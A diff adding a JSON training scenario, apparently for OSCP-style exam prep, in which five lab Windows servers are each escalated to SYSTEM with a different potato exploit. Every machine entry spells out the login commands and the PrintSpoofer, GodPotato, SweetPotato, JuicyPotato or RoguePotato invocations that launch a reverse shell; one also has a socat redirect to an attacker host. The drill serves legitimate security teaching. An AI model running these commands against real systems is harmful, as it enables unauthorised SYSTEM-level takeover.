@@ -1,0 +1,152 @@
+{
+  "id": "token-impersonation-gauntlet",
+  "title": "Token Impersonation Gauntlet",
+  "category": "technique-drill",
+  "source": ["8+ labs"],
+  "designed_by": "ai-composite",
+  "description": "Five Windows machines, each demonstrating a different potato technique: PrintSpoofer (Server 2019), GodPotato (Server 2022), SweetPotato (Server 2016), JuicyPotato (Server 2012), RoguePotato (Server 2019 no DCOM). All start with SeImpersonate privilege.",
+
+  "introduction": "This scenario teaches you to match Windows Server versions to the correct potato exploit—SeImpersonate privilege is common in labs, and knowing which tool works where saves critical exam time.",
+  "mental_model": "Think: SeImpersonate = privilege escalation opportunity. Check OS version first, then pick the right potato—no tool works on all versions.",
+  "key_principles": [
+    "Verify SeImpersonate with whoami /priv before attempting",
+    "Always match potato tool to server version",
+    "PrintSpoofer for 2019, GodPotato for 2022",
+    "JuicyPotato for 2012, SweetPotato for 2016",
+    "RoguePotato when DCOM is blocked"
+  ],
+
+  "indicators": {
+    "difficulty": 4,
+    "cognitive_load": 2,
+    "enumeration_depth": 1,
+    "rabbit_hole_risk": 1,
+    "time_pressure": 2
+  },
+
+  "mitre": {
+    "tactics": ["TA0004"],
+    "techniques": [
+      {"id": "T1134.001", "name": "Token Impersonation/Theft"},
+      {"id": "T1068", "name": "Exploitation for Privilege Escalation"}
+    ]
+  },
+
+  "kill_chain_phases": ["T4b-Win-PrivEsc"],
+
+  "environment": {
+    "machine_count": 5,
+    "network_count": 1,
+    "os_distribution": {"windows": 5, "linux": 0},
+    "has_ad": false,
+    "has_pivoting": false,
+    "has_client_side": false
+  },
+
+  "technique_tags": [
+    "printspoofer", "godpotato", "sweetpotato", "juicypotato",
+    "roguepotato", "seimpersonate", "potato", "token-impersonation"
+  ],
+
+  "exam_relevance": {
+    "oscp_exam_format": false,
+    "pen200_modules": [16, 17],
+    "pattern_frequency": "very-high",
+    "recommended_order": 1
+  },
+
+  "prerequisites": [],
+  "builds_on": [],
+
+  "networks": [
+    {"id": "external", "cidr": "10.10.10.0/24", "label": "External"}
+  ],
+
+  "machines": [
+    {
+      "id": "potato-1",
+      "label": "POTATO-1",
+      "ip": "10.10.10.101",
+      "os": "Windows Server 2019",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 5985, "name": "WinRM", "version": "", "vulnerabilities": [{"type": "auth", "summary": "Given creds", "leads_to": "local-user"}], "commands": ["evil-winrm -i 10.10.10.101 -u svc1 -p '<password>'"]},
+        {"port": 445, "name": "SMB", "version": "", "vulnerabilities": [{"type": "auth", "summary": "Given creds", "leads_to": "local-user"}], "commands": ["smbclient //10.10.10.101/C$ -U svc1"]}
+      ],
+      "privesc": [{"from": "svc1", "to": "SYSTEM", "technique": "PrintSpoofer (Server 2019)", "commands": ["whoami /priv", {"cmd": "PrintSpoofer64.exe -i -c cmd", "rationale": "Why: Abuse Spooler to impersonate SYSTEM for instant shell"}, "PrintSpoofer64.exe -c \"c:\\windows\\temp\\reverse-shell.exe\""]}],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "potato-2",
+      "label": "POTATO-2",
+      "ip": "10.10.10.102",
+      "os": "Windows Server 2022",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 5985, "name": "WinRM", "version": "", "vulnerabilities": [{"type": "auth", "summary": "Given creds", "leads_to": "local-user"}], "commands": ["evil-winrm -i 10.10.10.102 -u svc2 -p '<password>'"]},
+        {"port": 3389, "name": "RDP", "version": "", "vulnerabilities": [{"type": "auth", "summary": "Given creds", "leads_to": "local-user"}], "commands": ["xfreerdp /u:svc2 /p:'<password>' /v:10.10.10.102"]}
+      ],
+      "privesc": [{"from": "svc2", "to": "SYSTEM", "technique": "GodPotato (Server 2022)", "commands": ["whoami /priv", "GodPotato-NET4.exe -cmd \"cmd /c c:\\windows\\temp\\reverse-shell.exe\"", "GodPotato-NET4.exe -cmd \"cmd /c whoami\""]}],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "potato-3",
+      "label": "POTATO-3",
+      "ip": "10.10.10.103",
+      "os": "Windows Server 2016",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 5985, "name": "WinRM", "version": "", "vulnerabilities": [{"type": "auth", "summary": "Given creds", "leads_to": "local-user"}], "commands": ["evil-winrm -i 10.10.10.103 -u svc3 -p '<password>'"]},
+        {"port": 80, "name": "HTTP", "version": "IIS", "vulnerabilities": [{"type": "auth", "summary": "Web shell upload", "leads_to": "local-user"}], "commands": []}
+      ],
+      "privesc": [{"from": "svc3", "to": "SYSTEM", "technique": "SweetPotato (Server 2016)", "commands": ["whoami /priv", {"cmd": "SweetPotato.exe -p c:\\windows\\temp\\reverse-shell.exe", "rationale": "Why: Server 2016 needs SweetPotato; PrintSpoofer unreliable"}, "SweetPotato.exe -m mssql -p whoami"]}],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "potato-4",
+      "label": "POTATO-4",
+      "ip": "10.10.10.104",
+      "os": "Windows Server 2012",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 5985, "name": "WinRM", "version": "", "vulnerabilities": [{"type": "auth", "summary": "Given creds", "leads_to": "local-user"}], "commands": ["evil-winrm -i 10.10.10.104 -u svc4 -p '<password>'"]},
+        {"port": 1433, "name": "MSSQL", "version": "", "vulnerabilities": [{"type": "auth", "summary": "Given creds", "leads_to": "local-user"}], "commands": ["impacket-mssqlclient svc4:'<password>'@10.10.10.104"]}
+      ],
+      "privesc": [{"from": "svc4", "to": "SYSTEM", "technique": "JuicyPotato (Server 2012)", "commands": ["whoami /priv", "JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c \"c:\\windows\\temp\\reverse-shell.exe\"", "JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a \"/c whoami\" -t *"]}],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "potato-5",
+      "label": "POTATO-5",
+      "ip": "10.10.10.105",
+      "os": "Windows Server 2019",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 5985, "name": "WinRM", "version": "", "vulnerabilities": [{"type": "auth", "summary": "Given creds", "leads_to": "local-user"}], "commands": ["evil-winrm -i 10.10.10.105 -u svc5 -p '<password>'"]},
+        {"port": 445, "name": "SMB", "version": "", "vulnerabilities": [{"type": "auth", "summary": "Given creds", "leads_to": "local-user"}], "commands": []}
+      ],
+      "privesc": [{"from": "svc5", "to": "SYSTEM", "technique": "RoguePotato (Server 2019 no DCOM)", "commands": [{"cmd": "# On Kali: socat tcp-listen:135,reuseaddr,fork tcp:TARGET_IP:9999", "rationale": "Why: Redirect OXID resolver so fake DC receives auth request"}, {"cmd": "# On target: RoguePotato.exe -r <kali-ip> -e \"c:\\windows\\temp\\reverse-shell.exe\" -l 9999", "rationale": "Why: When DCOM blocked, use fake OXID server to steal SYSTEM token"}, "RoguePotato.exe -r <kali-ip> -e \"cmd /c whoami\" -l 9999"]}],
+      "credentials": [],
+      "alternatives": []
+    }
+  ],
+
+  "connections": [],
+
+  "attack_paths": [
+    {"id": "path-1", "name": "POTATO-1: PrintSpoofer", "color": "#6bb8cc", "steps": ["potato-1"], "description": "SeImpersonate → PrintSpoofer → SYSTEM"},
+    {"id": "path-2", "name": "POTATO-2: GodPotato", "color": "#e8a87c", "steps": ["potato-2"], "description": "SeImpersonate → GodPotato → SYSTEM"},
+    {"id": "path-3", "name": "POTATO-3: SweetPotato", "color": "#85e89d", "steps": ["potato-3"], "description": "SeImpersonate → SweetPotato → SYSTEM"},
+    {"id": "path-4", "name": "POTATO-4: JuicyPotato", "color": "#d2a8ff", "steps": ["potato-4"], "description": "SeImpersonate → JuicyPotato → SYSTEM"},
+    {"id": "path-5", "name": "POTATO-5: RoguePotato", "color": "#f0e68c", "steps": ["potato-5"], "description": "SeImpersonate → RoguePotato (no DCOM) → SYSTEM"}
+  ]
+}
